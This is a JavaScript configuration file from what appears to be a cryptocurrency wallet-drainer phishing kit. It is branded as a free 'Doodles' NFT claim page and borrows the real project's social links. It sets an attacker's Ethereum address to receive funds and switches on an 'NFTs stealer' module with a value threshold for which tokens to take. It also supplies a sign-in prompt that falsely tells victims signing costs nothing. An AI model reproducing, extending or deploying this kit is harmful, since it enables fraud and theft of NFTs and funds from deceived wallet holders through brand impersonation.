const receiveAddress = "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66";

const collectionInfo = {
    name: "Doodles Drop",
    socialMedia: {
        discord: "https://discord.com/invite/doodles",
        twitter: "https://twitter.com/doodles",
        instagram: "https://www.instagram.com/welikethedoodles/",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Claim Your Free Doodle",
}

const claimPageInfo = {
    title: "CLAIM YOUR<br>DOODLE", // <br> is a line break
    shortDescription: "DOODLES IN SPACE.",
    longDescription: "ALL DOODLERS CAN CLAIM THEIR SPACE DOODLE FOR FREE AND RECEIVE ITS OWN UNIQUE APPEARANCE AND COMPETENCIES WITHIN THEIR PERSONAL SPACECRAFT. STATS LIKE “BLADDER MANAGEMENT” AND “PILOTING ABILITY” DEFINE A DOODLES COMPETENCY IN SPACE.",

    claimButtonText: "CLAIM NOW",

    image: "adidas.png", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // Active (true) or not (false) NFTs stealer.
    minValue: 0.1, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    nftReceiveAddress: "0xd23014904512658528cDd2D379Bb59Ba4f7C3e66" // leave empty if you want to use the same as receiveAddress
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion